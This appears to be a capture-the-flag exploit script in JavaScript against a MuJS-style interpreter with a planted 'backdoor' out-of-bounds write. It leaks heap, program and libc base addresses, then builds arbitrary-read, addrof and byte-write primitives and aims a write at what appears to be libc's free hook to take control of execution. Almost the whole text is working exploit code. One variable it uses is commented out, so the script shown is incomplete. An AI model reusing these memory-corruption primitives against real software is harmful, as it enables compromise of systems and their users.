/*
enum js_Type {
	0 JS_TSHRSTR, / type tag doubles as string zero-terminator /
	1 JS_TUNDEFINED,
	2 JS_TNULL,
	3 JS_TBOOLEAN,
	4 JS_TNUMBER,
	5 JS_TLITSTR,
	6 JS_TMEMSTR,
	7 JS_TOBJECT,
};
*/
JRS = function() {
    function f2(B, r) {
        for (var t = [], n = null; r--;) n = B % 2,
        t[r] = n,
        B -= n,
        B /= 2;
        return t.join("")
    }
    function HexFn(B) {
        return parseInt(B, 2).toString(16)
    }
    function func1(B) {
        return B.replace(/(\d{4})/g, HexFn)
    }
    function h2s(B) {
        for (var r = "",
        t = 0; t < B.length - 1; t += 2) r += f2(parseInt(B.substring(t, t + 2), 16), 8);
        return r
    }
    function SngFwd(B, r, t) {
        var n = {};
        return t = Math.pow(2, 23) * t + .5,
        n.a = 255 & t,
        n.b = 255 & t >> 8,
        n.c = 127 & t >> 16 | (1 & r) << 7,
        n.d = B << 7 | r >> 1,
        n
    }
    function DblFwd(B, r, t) {
        var n = {};
        return t = Math.pow(2, 52) * t,
        n.a = 65535 & t,
        n.b = 65535 & t >> 16,
        t /= Math.pow(2, 32),
        n.c = 65535 & t,
        n.d = B << 15 | r << 4 | 15 & t >> 16,
        n
    }
    function CVTFWD(B, r) {
        var t = null,
        n = null,
        a = null,
        e = null,
        o = "",
        i = {
            32 : {
                d: 127,
                c: 128,
                b: 0,
                a: 0
            },
            64 : {
                d: 32752,
                c: 0,
                b: 0,
                a: 0
            }
        },
        s = {
            32 : 8,
            64 : 11
        } [B],
        u = B - s - 1;
        if (isNaN(r) && ((e = i[B]).a = 1, t = !1, n = Math.pow(2, s) - 1, a = Math.pow(2, -u)), e || (t = r < 0 || 1 / r < 0, isFinite(r) || (e = i[B], t && (e.d += 1 << B / 4 - 1), n = Math.pow(2, s) - 1, a = 0)), !e) {
            for (n = {
                32 : 127,
                64 : 1023
            } [B], a = Math.abs(r); a >= 2;) n++,
            a /= 2;
            for (; a < 1 && n > 0;) n--,
            a *= 2;
            n <= 0 && (a /= 2, o = "Z"),
            32 == B && n > 254 && (o = "Too big for Single", e = {
                d: t ? 255 : 127,
                c: 128,
                b: 0,
                a: 0
            },
            n = Math.pow(2, s) - 1, a = 0)
        }
        return e || (e = {
            32 : SngFwd,
            64 : DblFwd
        } [B](t, n, a)),
        e.sgn = +t,
        e.exp = f2(n, s),
        a = a % 1 * Math.pow(2, u),
        32 == B && (a = Math.floor(a + .5)),
        e.mnt = f2(a, u),
        e.nb01 = o,
        e
    }
    function CVTREV(B) {
        var r = {
            32 : 8,
            64 : 11
        } [B.length],
        t = B.match(new RegExp("^(.)(.{" + r + "})(.*)$")),
        n = "1" == t[1] ? -1 : 1;
        if (!/0/.test(t[2])) {
            var a = /1/.test(t[3]) ? NaN: n / 0;
            quit(1)
        }
        var e = 0 == +t[2],
        o = parseInt(t[2], 2) - Math.pow(2, r - 1) + 1;
        return n * (parseInt(t[3], 2) / Math.pow(2, t[3].length) + !e) * Math.pow(2, o + e)
    }
    this.f2 = function(d, size) {
        var NumW = size,
        Qty = d;
        with(CVTFWD(NumW, Qty)) return func1(sgn + exp + mnt)
    },
    this.h2t = function(B, r) {
        var t = r,
        n = h2s(B);
        if (new RegExp("^[01]{" + t + "}$").test(n)) return CVTREV(n);
    }
},
jrs = new JRS;
offset1=1293-64;
offset2=1293;

/* 利用backdoor越界寫改 value 的type 5->4做泄露，泄露出堆基地址*/
gc();
str2 = 'BBBBBBBBBBBBBBBB';
obj = {};
for (var i = 0; i < 0x500; i++) obj["a" + i] = "A";
backdoor(str2, offset1);
for (var leak = 0,i = 0; i < 0x500; i++){
    if(obj["a" + i]!="A") leak=obj["a" + i];
}
var heap_base=parseInt(jrs.f2(leak,64),16)+20;
print(heap_base.toString(16));

/* 構造利用backdoor進行越界讀，泄露程序基地址 */

function arb_read(addr){
    //print(jrs.h2t("0000" + addr.toString(16), 64))
    for (var i = 0; i < 0x500; i++) obj["a" + i] = jrs.h2t("0000" + addr.toString(16), 64);
    backdoor(str2, offset2);
    for (var leak = 0,i = 0; i < 0x500; i++){
        if(obj["a" + i]!=jrs.h2t("0000" + addr.toString(16), 64)) return leak=obj["a" + i];
    }
}
function read_hex(B) {
    for (var r = encodeURI(B), t = "", n = 0; n < r.length;)"%" != r[n] ? (t += r[n].charCodeAt(t).toString(16), n += 1) : (t += r.substring(n + 1, n + 3), n += 3);
    var res='';
    for(var i=t.length/2-1;i>=0;i--){
        res+=t.substring(2*i,2*i+2);
    }
    return parseInt(res,16);
}





leak=arb_read(heap_base);
var pb=0;
for(var i=0;;i+=8){
    leak=arb_read(heap_base+i);
    leak=leak.substring(0,7); 
    //leak=leak.split('').reverse().join('');  
    if(read_hex(leak).toString(16).substring(9,12)=="1d0"){
        pb=read_hex(leak)-0x000055555579c1d0+0x0000555555554000;
        print(pb.toString(16));
        break;
    }
}

var lb=read_hex(arb_read(pb+0x246de0))-620992;
print("lb :0x"+lb.toString(16));

function wb(addr,value){
    addr=addr-(value+512)*2
    //print(value&0xff+512);
    for (var i = 0; i < 0x500; i++) obj["a" + i] = jrs.h2t("0000" + addr.toString(16), 64);
    backdoor(str2, offset2);
    for (var leak = 0,i = 0; i < 0x500; i++){
        if(obj["a" + i]!=jrs.h2t("0000" + addr.toString(16), 64)) {backdoor(obj,0x11223344),backdoor(obj["a" + i],0x200+(value&0xff))};
    }
}

function ab(r, e) {
    var t = "0000" + e.toString(16);
    lo = parseInt(t.substring(8, 16), 16),
    hi = parseInt(t.substring(0, 8), 16);
    for (var a = 0; a < 4; a++) {
        var i = 255 & lo;
        lo >>= 8,
        wb(r + a, i)
    }
    for (a = 0; a < 3; a++) {
        i = 255 & hi;
        hi >>= 8,
        wb(r + 4 + a, i)
    }
}

function addrof(B) {
    for (var r = 0; r < 0x500; r++) obj["a" + r] = B;
    for (backdoor(str2, offset1), r = 0; r < 0x500; r++) if (obj["a" + r] != B) return parseInt(jrs.f2(obj["a" + r], 64), 16);
    return null
}

var fake=Array(1);
fake[0]=3.83698281517203e117;
var hax_addr=addrof(fake);
print("hax_addr--> 0x"+hax_addr.toString(16));
elem_addr = read_hex(arb_read(hax_addr + 8)),
print("elem_addr--> 0x"+elem_addr.toString(16));
//ea = read_hex(arb_read(elem_addr)),
//print("ea--> 0x"+ea.toString(16));
fh=lb+4118760;

target = fh - 32,
gc();
ab(target, ea),
wb(hax_addr + 47, 4);
ab(hax_addr+8 , target);
//wb(hax_addr + 47, 4);

//while(1){}






